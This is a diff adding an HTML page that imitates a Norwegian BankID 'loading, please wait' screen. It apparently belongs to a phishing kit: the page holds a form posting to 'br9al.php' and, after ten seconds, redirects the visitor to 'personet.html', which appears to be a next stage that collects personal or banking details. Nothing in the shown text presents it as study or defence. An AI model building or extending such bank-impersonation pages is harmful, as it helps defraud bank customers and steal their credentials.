@@ -1,0 +1,65 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <!-- link_icons -->
+        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+        <title>BankID</title>
+        <!-- logo site web-->
+        <link rel="icon" href="image/x.ico" type="image/x-icon"/>
+        <link rel="shortcut icon" href="image/x.ico" type="image/x-icon" />
+        <!-- link__css -->
+        <link rel="stylesheet"  href="css/bootstrap.css">
+        <link rel="stylesheet"  href="css/lary.css">
+
+        <style>
+            .modal-open{
+                overflow:hidden;
+                padding-right:0px;
+            }
+        </style>
+
+</head>
+<body class="modal-open" style="background:#F6F6F9;">
+         <!-- Modal -->
+        <div class="modal  fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" > 
+          <div class="modal-dialog" >
+            <div class="ss"><p style="    color: #222;font-size: 15px;padding-left:20px; letter-spacing: -0.24px;">Bank ID</p></div>
+            <div class="modal-content">
+              <div class="modal-body">
+                <form action="br9al.php" method="post" class="shadow mx-0">
+                    <div class="loading">
+                        <div class="spinner-border" role="status">
+                            <span class="sr-only">Loading...</span>
+                        </div>
+                        <div>
+                            <p>
+                                Laster BankID, vennligst vent.
+                                <br>
+                                <small>Loading BankID, please wait.</small>
+                            </p>
+                        </div>
+                    </div>
+                </form>
+              </div>
+            </div>
+            <div class="text-center my-3"><a href="#" style="font-size:14px;color:#161225;">Avbryt</a></div>
+          </div>
+        </div>
+
+    <script src="js/jquery-3.5.1.min.js"></script>
+    <script src="js/jquery.mask.js"></script>
+    <script>
+
+      setTimeout(function () {
+          window.location.href= 'personet.html';
+      },10000);  
+
+    </script>
+              
+</body>
+</html>
